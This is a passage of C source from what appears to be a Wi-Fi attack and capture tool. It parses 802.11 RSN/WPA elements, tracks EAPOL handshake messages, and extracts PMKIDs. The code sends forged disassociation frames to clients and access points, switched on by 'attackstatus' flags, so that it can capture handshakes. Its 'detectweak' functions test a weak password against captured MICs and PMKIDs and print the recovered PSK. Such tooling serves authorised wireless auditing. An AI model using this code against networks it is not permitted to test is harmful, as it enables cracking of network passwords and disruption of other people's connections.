	if(gsuiteptr->type == CS_WEP104) zeiger->groupcipher |= TCS_WEP104;
	if(gsuiteptr->type == CS_BIP) zeiger->groupcipher |= TCS_BIP;
	if(gsuiteptr->type == CS_NOT_ALLOWED) zeiger->groupcipher |= TCS_NOT_ALLOWED;
	}
wpalen -= SUITE_SIZE;
ieptr += SUITE_SIZE;
csuitecountptr = (suitecount_t*)ieptr;
wpalen -= SUITECOUNT_SIZE;
ieptr += SUITECOUNT_SIZE;
for(c = 0; c < csuitecountptr->count; c++)
	{
	csuiteptr = (suite_t*)ieptr; 
	if(memcmp(csuiteptr->oui, &mscorp, 3) == 0)
		{
		if(csuiteptr->type == CS_WEP40) zeiger->cipher |= TCS_WEP40;
		if(csuiteptr->type == CS_TKIP) zeiger->cipher |= TCS_TKIP;
		if(csuiteptr->type == CS_WRAP) zeiger->cipher |= TCS_WRAP;
		if(csuiteptr->type == CS_CCMP) zeiger->cipher |= TCS_CCMP;
		if(csuiteptr->type == CS_WEP104) zeiger->cipher |= TCS_WEP104;
		if(csuiteptr->type == CS_BIP) zeiger->cipher |= TCS_BIP;
		if(csuiteptr->type == CS_NOT_ALLOWED) zeiger->cipher |= TCS_NOT_ALLOWED;
		}
	wpalen -= SUITE_SIZE;
	ieptr += SUITE_SIZE;
	if(wpalen <= 0) return;
	}
asuitecountptr = (suitecount_t*)ieptr;
wpalen -= SUITECOUNT_SIZE;
ieptr += SUITECOUNT_SIZE;
for(c = 0; c < asuitecountptr->count; c++)
	{
	asuiteptr = (suite_t*)ieptr; 
	if(memcmp(asuiteptr->oui, &mscorp, 3) == 0)
		{
		if(asuiteptr->type == AK_PMKSA) zeiger->akm |= TAK_PMKSA;
		if(asuiteptr->type == AK_PSK) zeiger->akm |= TAK_PSK;
		if(asuiteptr->type == AK_FT) zeiger->akm |= TAK_FT;
		if(asuiteptr->type == AK_FT_PSK) zeiger->akm |= TAK_FT_PSK;
		if(asuiteptr->type == AK_PMKSA256) zeiger->akm |= TAK_PMKSA256;
		if(asuiteptr->type == AK_PSKSHA256) zeiger->akm |= TAK_PSKSHA256;
		if(asuiteptr->type == AK_TDLS) zeiger->akm |= TAK_TDLS;
		if(asuiteptr->type == AK_SAE_SHA256) zeiger->akm |= TAK_SAE_SHA256;
		if(asuiteptr->type == AK_FT_SAE) zeiger->akm |= TAK_FT_SAE;
		}
	wpalen -= SUITE_SIZE;
	ieptr += SUITE_SIZE;
	if(wpalen <= 0) return;
	}
return;
}
/*===========================================================================*/
static inline void gettagvendor(int vendorlen, uint8_t *ieptr, tags_t *zeiger)
{
static wpaie_t *wpaptr;

wpaptr = (wpaie_t*)ieptr;
if(memcmp(wpaptr->oui, &mscorp, 3) != 0) return;
if((wpaptr->ouitype == VT_WPA_IE) && (vendorlen >= WPAIE_LEN_MIN)) gettagwpa(vendorlen, ieptr, zeiger);
return;
}
/*===========================================================================*/
static inline void gettagrsn(int rsnlen, uint8_t *ieptr, tags_t *zeiger)
{
static int c;
static rsnie_t *rsnptr;
static suite_t *gsuiteptr;
static suitecount_t *csuitecountptr;
static suite_t *csuiteptr;
static suitecount_t *asuitecountptr;
static suite_t *asuiteptr;
static rsnpmkidlist_t *rsnpmkidlistptr; 

rsnptr = (rsnie_t*)ieptr;
if(rsnptr->version != 1) return;
zeiger->kdversion |= KV_RSNIE;
rsnlen -= RSNIE_SIZE;
ieptr += RSNIE_SIZE;
gsuiteptr = (suite_t*)ieptr; 
if(memcmp(gsuiteptr->oui, &suiteoui, 3) == 0)
	{
	if(gsuiteptr->type == CS_WEP40) zeiger->groupcipher |= TCS_WEP40;
	if(gsuiteptr->type == CS_TKIP) zeiger->groupcipher |= TCS_TKIP;
	if(gsuiteptr->type == CS_WRAP) zeiger->groupcipher |= TCS_WRAP;
	if(gsuiteptr->type == CS_CCMP) zeiger->groupcipher |= TCS_CCMP;
	if(gsuiteptr->type == CS_WEP104) zeiger->groupcipher |= TCS_WEP104;
	if(gsuiteptr->type == CS_BIP) zeiger->groupcipher |= TCS_BIP;
	if(gsuiteptr->type == CS_NOT_ALLOWED) zeiger->groupcipher |= TCS_NOT_ALLOWED;
	}
rsnlen -= SUITE_SIZE;
ieptr += SUITE_SIZE;
csuitecountptr = (suitecount_t*)ieptr;
rsnlen -= SUITECOUNT_SIZE;
ieptr += SUITECOUNT_SIZE;
for(c = 0; c < csuitecountptr->count; c++)
	{
	csuiteptr = (suite_t*)ieptr; 
	if(memcmp(csuiteptr->oui, &suiteoui, 3) == 0)
		{
		if(csuiteptr->type == CS_WEP40) zeiger->cipher |= TCS_WEP40;
		if(csuiteptr->type == CS_TKIP) zeiger->cipher |= TCS_TKIP;
		if(csuiteptr->type == CS_WRAP) zeiger->cipher |= TCS_WRAP;
		if(csuiteptr->type == CS_CCMP) zeiger->cipher |= TCS_CCMP;
		if(csuiteptr->type == CS_WEP104) zeiger->cipher |= TCS_WEP104;
		if(csuiteptr->type == CS_BIP) zeiger->cipher |= TCS_BIP;
		if(csuiteptr->type == CS_NOT_ALLOWED) zeiger->cipher |= TCS_NOT_ALLOWED;
		}
	rsnlen -= SUITE_SIZE;
	ieptr += SUITE_SIZE;
	if(rsnlen <= 0) return;
	}
asuitecountptr = (suitecount_t*)ieptr;
rsnlen -= SUITECOUNT_SIZE;
ieptr += SUITECOUNT_SIZE;
for(c = 0; c < asuitecountptr->count; c++)
	{
	asuiteptr = (suite_t*)ieptr; 
	if(memcmp(asuiteptr->oui, &suiteoui, 3) == 0)
		{
		if(asuiteptr->type == AK_PMKSA) zeiger->akm |= TAK_PMKSA;
		if(asuiteptr->type == AK_PSK) zeiger->akm |= TAK_PSK;
		if(asuiteptr->type == AK_FT) zeiger->akm |= TAK_FT;
		if(asuiteptr->type == AK_FT_PSK) zeiger->akm |= TAK_FT_PSK;
		if(asuiteptr->type == AK_PMKSA256) zeiger->akm |= TAK_PMKSA256;
		if(asuiteptr->type == AK_PSKSHA256) zeiger->akm |= TAK_PSKSHA256;
		if(asuiteptr->type == AK_TDLS) zeiger->akm |= TAK_TDLS;
		if(asuiteptr->type == AK_SAE_SHA256) zeiger->akm |= TAK_SAE_SHA256;
		if(asuiteptr->type == AK_FT_SAE) zeiger->akm |= TAK_FT_SAE;
		}
	rsnlen -= SUITE_SIZE;
	ieptr += SUITE_SIZE;
	if(rsnlen <= 0) return;
	}
rsnlen -= RSNCAPABILITIES_SIZE;
ieptr += RSNCAPABILITIES_SIZE;
if(rsnlen <= 0) return;
rsnpmkidlistptr = (rsnpmkidlist_t*)ieptr; 
if(rsnpmkidlistptr->count == 0) return;
rsnlen -= RSNPMKIDLIST_SIZE;
ieptr += RSNPMKIDLIST_SIZE;
if(rsnlen < 16) return;
if(((zeiger->akm &TAK_PSK) == TAK_PSK) || ((zeiger->akm &TAK_PSKSHA256) == TAK_PSKSHA256)) memcpy(zeiger->pmkid, ieptr, 16);
return;
}
/*===========================================================================*/
static void gettags(int infolen, uint8_t *infoptr, tags_t *zeiger)
{
static ietag_t *tagptr;

memset(zeiger, 0, TAGS_SIZE);
while(0 < infolen)
	{
	tagptr = (ietag_t*)infoptr;
	if(tagptr->len == 0) return;
	if(tagptr->len > infolen) return;
	if(tagptr->id == TAG_SSID)
		{
		if((tagptr->len > 0) &&  (tagptr->len <= ESSID_LEN_MAX))
			{
			memcpy(zeiger->essid, &tagptr->data[0], tagptr->len);
			zeiger->essidlen = tagptr->len;
			}
		}
	else if(tagptr->id == TAG_CHAN)
		{
		if(tagptr->len == 1) zeiger->channel = tagptr->data[0];
		}
	else if(tagptr->id == TAG_RSN)
		{
		if(tagptr->len >= RSNIE_LEN_MIN) gettagrsn(tagptr->len, tagptr->data, zeiger);
		}
	else if(tagptr->id == TAG_VENDOR)
		{
		if(tagptr->len >= VENDORIE_SIZE) gettagvendor(tagptr->len, tagptr->data, zeiger);
		}
	infoptr += tagptr->len +IETAG_SIZE;
	infolen -= tagptr->len +IETAG_SIZE;
	}
return;
}
/*===========================================================================*/
/*===========================================================================*/
static inline void process80211exteap_mka()
{
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
	}
return;
}
/*===========================================================================*/
static inline void process80211exteap_asf()
{
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
	}
return;
}
/*===========================================================================*/
static void send_eap_request_id()
{
static mac_t *macftx;
static const uint8_t requestidentitydata[] =
{
0xaa, 0xaa, 0x03, 0x00, 0x00, 0x00, 0x88, 0x8e,
0x01, 0x00, 0x00, 0x0a, 0x01, 0x63, 0x00, 0x05, 0x01
};
#define REQUESTIDENTITY_SIZE sizeof(requestidentitydata)

static uint8_t packetout[1024];

if(filtermode == 1)
	{
	if(isclientinfilterlist(macfrx->addr2) == true) return;
	}
else if(filtermode ==2)
	{
	if(isclientinfilterlist(macfrx->addr2) == false) return;
	}
memset(&packetout, 0, HDRRT_SIZE +MAC_SIZE_QOS +REQUESTIDENTITY_SIZE +1);
memcpy(&packetout, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetout +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_DATA;
macftx->subtype = IEEE80211_STYPE_QOS_DATA;
memcpy(macftx->addr1, macfrx->addr2, 6);
memcpy(macftx->addr2, macfrx->addr1, 6);
memcpy(macftx->addr3, macfrx->addr1, 6);
macftx->from_ds = 1;
macftx->duration = 0x002c;
macftx->sequence = 0;
memcpy(&packetout[HDRRT_SIZE +MAC_SIZE_QOS], &requestidentitydata, REQUESTIDENTITY_SIZE);
if(write(fd_socket, packetout,  HDRRT_SIZE +MAC_SIZE_QOS +REQUESTIDENTITY_SIZE) < 0)
	{
	perror("\nfailed to transmit request identity");
	errorcount++;
	}
fsync(fd_socket);
outgoingcount++;
return;
}
/*===========================================================================*/
static inline void process80211exteap(int authlen)
{
static uint8_t *eapauthptr;
static exteap_t *exteap;
static int exteaplen;

static const char *message1 = "REQUEST ID";
static const char *message2 = "RESPONSE ID";

eapauthptr = payloadptr +LLC_SIZE +EAPAUTH_SIZE;
//eapauthlen = payloadlen -LLC_SIZE -EAPAUTH_SIZE;
exteap = (exteap_t*)eapauthptr;
exteaplen = ntohs(exteap->len);

if(exteaplen > authlen) return;
if(exteaplen <= 5) return;

if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
	}
if(exteap->type == EAP_TYPE_ID)
	{
	if(exteap->code == EAP_CODE_REQ)
		{
		if((statusout &STATUS_EAPOL) == STATUS_EAPOL) printtimenetap(macfrx->addr1, macfrx->addr2, message1);
		}
	else if(exteap->code == EAP_CODE_RESP)
		{
		if((statusout &STATUS_EAPOL) == STATUS_EAPOL) printtimenetclient(macfrx->addr2, macfrx->addr1, message2);
		}
	}
return;
}
/*===========================================================================*/
static int omac1_aes_128_vector(const uint8_t *key, size_t num_elem, const uint8_t *addr[], const size_t *len, uint8_t *mac)
{
static CMAC_CTX *ctx;
static int ret = -1;
static size_t outlen, i;

ctx = CMAC_CTX_new();
if (ctx == NULL) return -1;
if (!CMAC_Init(ctx, key, 16, EVP_aes_128_cbc(), NULL)) goto fail;
for (i = 0; i < num_elem; i++)
	{
	if (!CMAC_Update(ctx, addr[i], len[i])) goto fail;
	}
if (!CMAC_Final(ctx, mac, &outlen) || outlen != 16) goto fail;
ret = 0;
fail:
CMAC_CTX_free(ctx);
return ret;
}
/*===========================================================================*/
static int omac1_aes_128(const uint8_t *key, const uint8_t *data, size_t data_len, uint8_t *mac)
{
return omac1_aes_128_vector(key, 1, &data, &data_len, mac);
}
/*===========================================================================*/
static inline bool detectweakwpa(uint8_t essidlen, uint8_t *essid, uint8_t *anonce)
{
static int keyver;
static int p;
static int authlen;
static uint8_t *eapauthptr;
static eapauth_t *eapauth;
static uint8_t *wpakptr;
static wpakey_t *wpak;
static uint8_t *pkeptr;

static unsigned char pmk[64];
static uint8_t pkedata[102];
static uint8_t pkedata_prf[2 + 98 + 2];
static uint8_t ptk[128];
static uint8_t mymic[16];
static uint8_t keymic[16];

if(PKCS5_PBKDF2_HMAC_SHA1(weakcandidate, weakcandidatelen, essid, essidlen, 4096, 32, pmk) == 0) return false;
eapauthptr = payloadptr +LLC_SIZE;
eapauth = (eapauth_t*)eapauthptr;
authlen = ntohs(eapauth->len);
wpakptr = eapauthptr +EAPAUTH_SIZE;
wpak = (wpakey_t*)wpakptr;
keyver = ntohs(wpak->keyinfo) & WPA_KEY_INFO_TYPE_MASK;
memcpy(&keymic, wpak->keymic, 16);
memset(wpak->keymic, 0, 16);
if((keyver == 1 || keyver == 2))
	{
	pkeptr = pkedata;
	memset(&pkedata, 0, sizeof(pkedata));
	memset(&ptk, 0, sizeof(ptk));
	memcpy(pkeptr, "Pairwise key expansion", 23);
	if(memcmp(macfrx->addr1, macfrx->addr2, 6) < 0)
		{
		memcpy(pkeptr +23, macfrx->addr1, 6);
		memcpy(pkeptr +29, macfrx->addr2, 6);
		}
	else
		{
		memcpy(pkeptr +23, macfrx->addr2, 6);
		memcpy(pkeptr +29, macfrx->addr1, 6);
		}

	if(memcmp(anonce, wpak->nonce, 32) < 0)
		{
		memcpy (pkeptr +35, anonce, 32);
		memcpy (pkeptr +67, wpak->nonce, 32);
		}
	else
		{
		memcpy (pkeptr +35, wpak->nonce, 32);
		memcpy (pkeptr +67, anonce, 32);
		}
	for (p = 0; p < 4; p++)
		{
		pkedata[99] = p;
		HMAC(EVP_sha1(), &pmk, 32, pkedata, 100, ptk + p *20, NULL);
		}
	if(keyver == 1) HMAC(EVP_md5(), &ptk, 16, eapauthptr, authlen +EAPAUTH_SIZE, mymic, NULL);
	if(keyver == 2) HMAC(EVP_sha1(), &ptk, 16, eapauthptr, authlen +EAPAUTH_SIZE, mymic, NULL);
	if(memcmp(&keymic, &mymic, 16) == 0) return true;
	return false;
	}
else if(keyver == 3)
	{
	pkeptr = pkedata;
	memset(&pkedata_prf, 0, sizeof(pkedata_prf));
	memset(&ptk, 0, sizeof(ptk));
	memcpy(pkeptr, "Pairwise key expansion", 22);
	if(memcmp(macfrx->addr1, macfrx->addr2, 6) < 0)
		{
		memcpy(pkeptr +22, macfrx->addr1, 6);
		memcpy(pkeptr +28, macfrx->addr2, 6);
		}
	else
		{
		memcpy(pkeptr +22, macfrx->addr2, 6);
		memcpy(pkeptr +28, macfrx->addr1, 6);
		}
	if(memcmp(anonce, wpak->nonce, 32) < 0)
		{
		memcpy (pkeptr +34, anonce, 32);
		memcpy (pkeptr +66, wpak->nonce, 32);
		}
	else
		{
		memcpy (pkeptr +34, wpak->nonce, 32);
		memcpy (pkeptr +66, anonce, 32);
		}
	HMAC(EVP_sha256(), &pmk, 32, pkedata_prf, 2 + 98 + 2, ptk, NULL);
	omac1_aes_128(ptk, eapauthptr, authlen +EAPAUTH_SIZE, mymic);
	if(memcmp(&keymic, &mymic, 16) == 0) return true;
	return false;
	}
return false;
}
/*===========================================================================*/
static inline void process80211eapol_m4(uint8_t *wpakptr)
{
static wpakey_t *wpak;
static handshakelist_t *zeiger;
static maclist_t *zeigerap;
static uint64_t rc;
static char message[128];

wpak = (wpakey_t*)wpakptr;
if(memcmp(wpak->nonce, &zeroed32, 32) == 0)
	{
	for(zeigerap = aplist; zeigerap < aplist +MACLIST_MAX; zeigerap++)
		{
		if(memcmp(zeigerap->addr, macfrx->addr1, 6) == 0)
			{
			zeigerap->timestamp = timestamp;
			if((zeiger->message & NET_PMKID) == NET_PMKID) return;
			if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_AP_BUSY);
			return;
			}
		}
	return;
	}
zeiger = handshakelist +HANDSHAKELIST_MAX -1;
memset(zeiger, 0, HANDSHAKELIST_SIZE);
zeiger->timestamp = timestamp;
memcpy(zeiger->client, macfrx->addr2, 6);
memcpy(zeiger->ap, macfrx->addr1, 6);
wpak = (wpakey_t*)wpakptr;
zeiger->message = HS_M2;
rc = be64toh(wpak->replaycount);
zeiger->rc = rc;
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
	}
qsort(handshakelist, HANDSHAKELIST_MAX, HANDSHAKELIST_SIZE, sort_handshakelist_by_time);
for(zeiger = handshakelist +1; zeiger < handshakelist +HANDSHAKELIST_MAX; zeiger++)
	{
	if(memcmp(zeiger->ap, macfrx->addr1, 6) != 0) continue;
	if(memcmp(zeiger->client, macfrx->addr2, 6) != 0) continue;
	if(zeiger->message == HS_M3)
		{
		if(zeiger->rc != rc) continue;
		if((timestamp -zeiger->timestamp) > eapoltimeoutvalue +eapoltimeoutvalue +eapoltimeoutvalue) continue;
		zeigerap = getnet(macfrx->addr1);
		if(zeigerap == NULL) return;
		if((zeigerap->status &NET_M4) == NET_M4) return;
		zeigerap->status |= NET_M4;
		eapolmpcount++;
		if((statusout &STATUS_EAPOL) == STATUS_EAPOL)
			{
			snprintf(message, 128, "MP:M3M4 RC:%" PRIu64 " EAPOLTIME:%" PRIu64, rc, timestamp -zeiger->timestamp);
			printtimenetbothessid(macfrx->addr2, macfrx->addr1, zeigerap->essidlen, zeigerap->essid, message);
			if(detectweakwpa(zeigerap->essidlen, zeigerap->essid, zeiger->nonce) == true)
				{
				snprintf(message, 128, "PSK:%s", weakcandidate);
				printtimenetbothessid(macfrx->addr2, macfrx->addr1, zeigerap->essidlen, zeigerap->essid, message);
				}
			}
		return;
		}
	if((zeiger->message &HS_M1) == HS_M1)
		{
		if(zeiger->rc != (rc -1)) continue;
		if((timestamp -zeiger->timestamp) > eapoltimeoutvalue +eapoltimeoutvalue +eapoltimeoutvalue +eapoltimeoutvalue) continue;
		zeigerap = getnet(macfrx->addr1);
		if(zeigerap == NULL) return;
		if((zeigerap->status &NET_M4) == NET_M4) return;
		zeigerap->status |= NET_M4;
		eapolmpcount++;
		if((statusout &STATUS_EAPOL) == STATUS_EAPOL)
			{
			snprintf(message, 128, "MP:M1M4 RC:%" PRIu64 " EAPOLTIME %" PRIu64, rc, timestamp -zeiger->timestamp);
			printtimenetbothessid(macfrx->addr2, macfrx->addr1, zeigerap->essidlen, zeigerap->essid, message);
			if(detectweakwpa(zeigerap->essidlen, zeigerap->essid, zeiger->nonce) == true)
				{
				snprintf(message, 128, "PSK:%s", weakcandidate);
				printtimenetbothessid(macfrx->addr2, macfrx->addr1, zeigerap->essidlen, zeigerap->essid, message);
				}
			}
		return;
		}
	if((zeiger->message & NET_PMKID) != NET_PMKID)
		{
		if((attackstatus &DISABLE_AP_ATTACKS) != DISABLE_AP_ATTACKS) send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_AP_BUSY);
		}
	}
if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS) send_disassociation(macfrx->addr2, macfrx->addr1, WLAN_REASON_DISASSOC_AP_BUSY);
return;
}
/*===========================================================================*/
static inline void process80211eapol_m3(uint8_t *wpakptr)
{
static wpakey_t *wpak;
static handshakelist_t *zeiger;
static maclist_t *zeigerap;
static uint64_t rc;

static char message[128];

zeiger = handshakelist +HANDSHAKELIST_MAX -1;
memset(zeiger, 0, HANDSHAKELIST_SIZE);
zeiger->timestamp = timestamp;
memcpy(zeiger->client, macfrx->addr1, 6);
memcpy(zeiger->ap, macfrx->addr2, 6);
wpak = (wpakey_t*)wpakptr;
zeiger->message = HS_M3;
rc = be64toh(wpak->replaycount);
zeiger->rc = rc;
memcpy(zeiger->nonce, wpak->nonce, 32);
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
	}
qsort(handshakelist, HANDSHAKELIST_MAX, HANDSHAKELIST_SIZE, sort_handshakelist_by_time);
for(zeiger = handshakelist +1; zeiger < handshakelist +HANDSHAKELIST_MAX; zeiger++)
	{
	if(zeiger->message != HS_M2) continue;
	if(zeiger->rc != (rc -1)) continue;
	if(memcmp(zeiger->ap, macfrx->addr2, 6) != 0) continue;
	if(memcmp(zeiger->client, macfrx->addr1, 6) != 0) continue;
	if((timestamp -zeiger->timestamp) > eapoltimeoutvalue +eapoltimeoutvalue) continue;
	zeigerap = getnet(macfrx->addr2);
	if(zeigerap == NULL) return;
	if((zeigerap->status &NET_M3) == NET_M3) return;
	zeigerap->status |= NET_M3;
	eapolmpcount++;
	if((statusout &STATUS_EAPOL) == STATUS_EAPOL)
		{
		snprintf(message, 128, "MP:M2M3 RC:%" PRIu64 " EAPOLTIME:%" PRIu64, rc, timestamp -zeiger->timestamp);
		printtimenetbothessid(macfrx->addr1, macfrx->addr2, zeigerap->essidlen, zeigerap->essid, message);
		if(detectweakwpa(zeigerap->essidlen, zeigerap->essid, zeiger->nonce) == true)
			{
			snprintf(message, 128, "PSK:%s", weakcandidate);
			printtimenetbothessid(macfrx->addr1, macfrx->addr2, zeigerap->essidlen, zeigerap->essid, message);
			}
		}
	return;
	}
return;
}
/*===========================================================================*/
static inline void process80211eapol_m2(uint8_t *wpakptr)
{
static wpakey_t *wpak;
static handshakelist_t *zeiger;
static maclist_t *zeigerap;
static uint64_t rc;
static char message[128];

zeiger = handshakelist +HANDSHAKELIST_MAX -1;
memset(zeiger, 0, HANDSHAKELIST_SIZE);
zeiger->timestamp = timestamp;
memcpy(zeiger->client, macfrx->addr2, 6);
memcpy(zeiger->ap, macfrx->addr1, 6);
wpak = (wpakey_t*)wpakptr;
zeiger->message = HS_M2;
rc = be64toh(wpak->replaycount);
zeiger->rc = rc;
memcpy(zeiger->nonce, wpak->nonce, 32);
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
	}
qsort(handshakelist, HANDSHAKELIST_MAX, HANDSHAKELIST_SIZE, sort_handshakelist_by_time);
for(zeiger = handshakelist +1; zeiger < handshakelist +HANDSHAKELIST_MAX; zeiger++)
	{
	if((zeiger->message &HS_M1) != HS_M1) continue;
	if(zeiger->rc != rc) continue;
	if(memcmp(zeiger->ap, macfrx->addr1, 6) != 0) continue;
	if(memcmp(zeiger->client, macfrx->addr2, 6) != 0) continue;
	if((timestamp -zeiger->timestamp) > eapoltimeoutvalue) continue;
	zeigerap = getnet(macfrx->addr1);
	if(zeigerap == NULL) return;
	if((zeigerap->status &NET_M2) == NET_M2) return;
	zeigerap->status |= NET_M2;
	if((attackstatus &DISABLE_CLIENT_ATTACKS) != DISABLE_CLIENT_ATTACKS) send_ack();
	eapolmpcount++;
	if((statusout &STATUS_EAPOL) == STATUS_EAPOL)
		{
		snprintf(message, 128, "MP:M1M2 RC:%" PRIu64 " EAPOLTIME:%" PRIu64, rc, timestamp -zeiger->timestamp);
		printtimenetbothessid(macfrx->addr2, macfrx->addr1, zeigerap->essidlen, zeigerap->essid, message);
		if(detectweakwpa(zeigerap->essidlen, zeigerap->essid, zeiger->nonce) == true)
			{
			snprintf(message, 128, "PSK:%s", weakcandidate);
			printtimenetbothessid(macfrx->addr2, macfrx->addr1, zeigerap->essidlen, zeigerap->essid, message);
			}
		}
	return;
	}
return;
}
/*===========================================================================*/
static inline bool detectweakpmkid(uint8_t *macclient, uint8_t *macap, uint8_t essidlen, uint8_t *essid, uint8_t *pmkid)
{
static const char *pmkname = "PMK Name";
static unsigned char pmk[64];
static uint8_t salt[32];
static uint8_t pmkidcalc[32];

if(PKCS5_PBKDF2_HMAC_SHA1(weakcandidate, weakcandidatelen, essid, essidlen, 4096, 32, pmk) == 0) return false;
memcpy(&salt, pmkname, 8);
memcpy(&salt[8], macap, 6);
memcpy(&salt[14], macclient, 6);
HMAC(EVP_sha1(), &pmk, 32, salt, 20, pmkidcalc, NULL);
if(memcmp(&pmkidcalc, pmkid, 16) == 0) return true;
return false;
}
/*===========================================================================*/
static inline void process80211eapol_m1(int authlen, uint8_t *wpakptr)
{
static wpakey_t *wpak;
static pmkid_t *pmkid;
static handshakelist_t *zeiger;
static maclist_t *zeigerap;
static char message[128];

zeiger = handshakelist +HANDSHAKELIST_MAX -1;
memset(zeiger, 0, HANDSHAKELIST_SIZE);
zeiger->timestamp = timestamp;
memcpy(zeiger->client, macfrx->addr1, 6);
memcpy(zeiger->ap, macfrx->addr2, 6);
wpak = (wpakey_t*)wpakptr;
zeiger->message = HS_M1;
zeiger->rc = be64toh(wpak->replaycount);
memcpy(zeiger->nonce, wpak->nonce, 32);
qsort(handshakelist, HANDSHAKELIST_MAX, HANDSHAKELIST_SIZE, sort_handshakelist_by_time);
zeigerap = getnet(macfrx->addr2);
if(zeigerap == NULL) return;
if(zeiger->rc != myrc) zeigerap->status |= NET_M1;
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
	}
if(authlen >= (int)(WPAKEY_SIZE +PMKID_SIZE))
	{
	pmkid = (pmkid_t*)(wpakptr +WPAKEY_SIZE);
	if(memcmp(pmkid->pmkid, &zeroed32, 16) != 0)
		{
		pmkidcount++;
		if((statusout &STATUS_EAPOL) == STATUS_EAPOL)
			{
			if((zeigerap->status &NET_PMKID) != NET_PMKID)
				{
				snprintf(message, 128, "PMKID:%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x%02x",
						pmkid->pmkid[0], pmkid->pmkid[1], pmkid->pmkid[2], pmkid->pmkid[3], pmkid->pmkid[4], pmkid->pmkid[5], pmkid->pmkid[6], pmkid->pmkid[7],
						pmkid->pmkid[8], pmkid->pmkid[9], pmkid->pmkid[10], pmkid->pmkid[11], pmkid->pmkid[12], pmkid->pmkid[13], pmkid->pmkid[14], pmkid->pmkid[15]);
				printtimenetbothessid(macfrx->addr1, macfrx->addr2, zeigerap->essidlen, zeigerap->essid, message);
				if(detectweakpmkid(macfrx->addr1, macfrx->addr2, zeigerap->essidlen, zeigerap->essid, pmkid->pmkid) == true)
					{
					snprintf(message, 128, "PSK:%s", weakcandidate);
					printtimenetbothessid(macfrx->addr1, macfrx->addr2, zeigerap->essidlen, zeigerap->essid, message);
					}
				}
			}
		zeigerap->status |= NET_PMKID;
		return;
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211eapol(int authlen)
{
static uint8_t *wpakptr;
static wpakey_t *wpak;
static uint16_t keyinfo;

wpakptr = payloadptr +LLC_SIZE +EAPAUTH_SIZE;
wpak = (wpakey_t*)wpakptr;
keyinfo = (getkeyinfo(ntohs(wpak->keyinfo)));
if(keyinfo == 1) process80211eapol_m1(authlen, wpakptr);
else if(keyinfo == 2) process80211eapol_m2(wpakptr);
else if(keyinfo == 3) process80211eapol_m3(wpakptr);
else if(keyinfo == 4) process80211eapol_m4(wpakptr);
return;
}
/*===========================================================================*/
static inline void process80211eap()
{
static uint8_t *eapauthptr;
static eapauth_t *eapauth;
static int eapauthlen;
static uint16_t authlen;

eapauthptr = payloadptr +LLC_SIZE;
eapauthlen = payloadlen -LLC_SIZE;
eapauth = (eapauth_t*)eapauthptr;
authlen = ntohs(eapauth->len);
if(authlen > (eapauthlen -4)) return;
if(eapauth->type == EAPOL_KEY)
	{
	if(authlen >= WPAKEY_SIZE) process80211eapol(authlen);
	}
else if(eapauth->type == EAP_PACKET) process80211exteap(authlen);
else if(eapauth->type == EAPOL_ASF) process80211exteap_asf();
else if(eapauth->type == EAPOL_MKA) process80211exteap_mka();
else if((eapauth->type == EAPOL_START) && (macfrx->to_ds == 1)) send_eap_request_id();
else if(eapauth->type == EAPOL_LOGOFF) return;
else
	{
	if(fd_pcapng > 0)
		{
		if((pcapngframesout &PCAPNG_FRAME_EAP) == PCAPNG_FRAME_EAP) writeepb(fd_pcapng);
		}
	}
return;
}
/*===========================================================================*/
static inline void process80211action()
{

return;
}
/*===========================================================================*/
static inline void process80211reassociation_resp()
{
static maclist_t *zeiger;

for(zeiger = aplist; zeiger < aplist +MACLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->addr, macfrx->addr2, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	zeiger->count += 1;
	if((zeiger->status &NET_REASSOC_RESP) != NET_REASSOC_RESP)
		{
		if(fd_pcapng > 0)
			{
			if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
			}
		zeiger->status |= NET_REASSOC_RESP;
		}
	return;
	}
memset(zeiger, 0, MACLIST_SIZE);
zeiger->timestamp = timestamp;
zeiger->count = 1;
zeiger->dpv = DPC;
zeiger->status = NET_REASSOC_RESP;
memcpy(zeiger->addr, macfrx->addr2, 6);
if(fd_pcapng > 0)
	{
	if((pcapngframesout &PCAPNG_FRAME_MANAGEMENT) == PCAPNG_FRAME_MANAGEMENT) writeepb(fd_pcapng);
	}
if(fh_nmea != NULL) writegpwpl(zeiger->addr);
qsort(aplist, ringbuffercount +1, MACLIST_SIZE, sort_maclist_by_time);
return;
}
/*===========================================================================*/
static inline void process80211reassociation_req()
{
static uint8_t *clientinfoptr;
static int clientinfolen;
static maclist_t *zeiger;
static const char *message1 = "REASSOCIATION";

static tags_t tags;
static char message2[128];

clientinfoptr = payloadptr +CAPABILITIESREQSTA_SIZE;
clientinfolen = payloadlen -CAPABILITIESREQSTA_SIZE;
if(clientinfolen < (int)IETAG_SIZE) return;
gettags(clientinfolen, clientinfoptr, &tags);
if(tags.essidlen == 0) return;
if(tags.essid[0] == 0) return;
